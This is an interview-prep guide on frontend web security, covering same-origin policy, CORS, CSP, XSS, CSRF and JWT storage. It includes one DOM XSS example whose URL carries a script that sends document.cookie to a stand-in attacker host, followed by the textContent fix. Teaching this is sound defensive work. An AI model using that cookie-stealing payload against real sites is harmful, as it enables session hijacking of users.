# Web Platform Security: Same-Origin Policy, CORS, CSP, XSS, CSRF, & JWTs

## Why It Matters
Senior frontend engineers must master web security concepts to protect user data and prevent account takeovers. Storing authentication tokens insecurely, neglecting Content Security Policies (CSP), or writing vulnerable DOM insertion logic exposes applications to Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) attacks.

---

## Core Concepts & Mental Models

### 1. Same-Origin Policy (SOP) & CORS
- **Same-Origin Policy (SOP)**: A security mechanism that restricts scripts on one origin from accessing data on another origin. An origin is defined by the **protocol**, **host (domain)**, and **port** (e.g. `https://example.com:443`).
- **Cross-Origin Resource Sharing (CORS)**: A protocol that allows servers to bypass SOP boundaries by declaring which origins are permitted to read their API responses.
  - **Preflight Request (`OPTIONS`)**: For non-simple requests (e.g., custom headers, JSON body), the browser automatically sends an initial `OPTIONS` request to check if the server permits the cross-origin call.
  - **CORS Headers**: `Access-Control-Allow-Origin`, `Access-Control-Allow-Methods`, `Access-Control-Allow-Headers`.

### 2. Content Security Policy (CSP)
A CSP is an HTTP header or meta tag that defines which resources (scripts, stylesheets, images, connections) the browser is allowed to load. It prevents XSS by disabling inline script execution and blocking unauthorized external domains.
- E.g., `Content-Security-Policy: default-src 'self'; script-src 'self' https://trustedscripts.com;`

### 3. XSS (Cross-Site Scripting)
Malicious scripts are injected into trusted websites and executed in the victim's browser:
- **Stored XSS**: Malicious script is saved in the database (e.g. a comment field) and executed whenever users view that page.
- **Reflected XSS**: Malicious script is passed in a URL parameter and reflected in the page output.
- **DOM-Based XSS**: Malicious script is parsed and executed directly by client-side JavaScript mutating the DOM (e.g. using `innerHTML` or `eval()`).
- **Prevention**: Sanitize HTML inputs, escape output strings (use `.textContent` instead of `.innerHTML`), and enforce strict CSPs.

### 4. CSRF (Cross-Site Request Forgery)
An attacker tricks a logged-in user into executing unauthorized actions on a target site.
- **The Mechanism**: Browsers automatically append cookies to cross-origin requests. If a user is logged into `bank.com`, clicking a link on `malicious.com` that sends a post request to `bank.com/transfer` will automatically include the session cookie.
- **Prevention**:
  - Use the **`SameSite` Cookie Attribute**:
    - `SameSite=Strict`: Cookies are only sent in first-party contexts.
    - `SameSite=Lax` (modern default): Cookies are sent on top-level safe navigations (links) but blocked on cross-site subrequests (images, POST requests).
    - `SameSite=None`: Cookies are sent on all requests (requires `Secure` flag).
  - Enforce **Anti-CSRF Tokens**: Check unique, cryptographically secure tokens inside POST/PUT bodies on the server.
  - Check custom HTTP headers: E.g., `X-Requested-With` or `Origin` headers.

### 5. JWT Secure Token Storage: LocalStorage vs. Cookies
Where should you store JSON Web Tokens (JWT) in the frontend?

```
Authentication Token Storage Tradeoffs:
┌────────────────────────────────────────────────────────┐
│ LocalStorage / SessionStorage                          │
│  - Vulnerable to XSS (Accessible via window scripts)   │
│  - Immune to CSRF (Must be manually added to headers) │
└──────────────────────────┬─────────────────────────────┘
                           VS.
┌────────────────────────────────────────────────────────┐
│ HTTP-Only Cookies (with Secure, SameSite=Lax/Strict)   │
│  - Immune to XSS (Inaccessible via document.cookie)   │
│  - Vulnerable to CSRF (Must use SameSite/CSRF tokens)  │
└────────────────────────────────────────────────────────┘
```

---

## Real-World Case Study / Examples

### 1. DOM XSS via Unescaped Query String
A search results page displays the search query directly using `innerHTML`:

```javascript
// URL: http://app.com/search?q=<script>fetch('http://attacker.com?cookie='+document.cookie)</script>
const query = new URLSearchParams(window.location.search).get("q");
resultsTitle.innerHTML = `Results for: ${query}`; // Executes the script!
```
**Fix:** Always use safe DOM setters that treat inputs as plain text:
```javascript
resultsTitle.textContent = `Results for: ${query}`; // Renders as plain text, no execution
```

---

## Common Interview Traps

### 1. CORS vs. Server Security
**Trap:** Believing that CORS is a server protection tool. CORS is a **browser-enforced** mechanism. If a server receives a cross-origin request, it executes the operation first and returns the data *along with* the CORS headers. The browser then intercepts the response and blocks the client application from reading it if the headers do not match. CORS does **not** prevent server execution—it only prevents the client browser from reading the result.

---

## Junior vs. Senior View

- **Junior View**: "XSS is when someone steals your password, and I resolve CORS errors by asking the backend team to add '*' to the headers."
- **Senior View**: "CORS is a browser-enforced resource-sharing policy, not a server blocker. I prevent XSS by escaping HTML outputs and enforcing CSP headers, and mitigate CSRF by using `SameSite=Lax/Strict` cookies. I store sensitive tokens in `HttpOnly` cookies to protect them from XSS, and implement anti-CSRF tokens to prevent cross-site request forgery."

---

## Related Interview Questions
1. "Detail what happens during a CORS preflight (`OPTIONS`) request, and under what circumstances it is skipped."
2. "How does a Content Security Policy nonce (number used once) protect against inline script XSS injections?"
3. "Explain the security tradeoffs of using `SameSite=Lax` vs. `SameSite=Strict` for session cookies."
4. "Why is setting `Access-Control-Allow-Origin: *` considered an anti-pattern when combined with `Access-Control-Allow-Credentials: true`?"

---

## Authentication Basics & Same-Origin Policies
- **Authentication basics**: Secure session cookies vs. stateless tokens. Storing tokens on the client requires configuring `secure`, `HttpOnly`, and `SameSite` flags.
- **JWT Handling**: Access tokens are kept in-memory, while refresh tokens reside in HttpOnly cookies to mitigate XSS exfiltration risks.
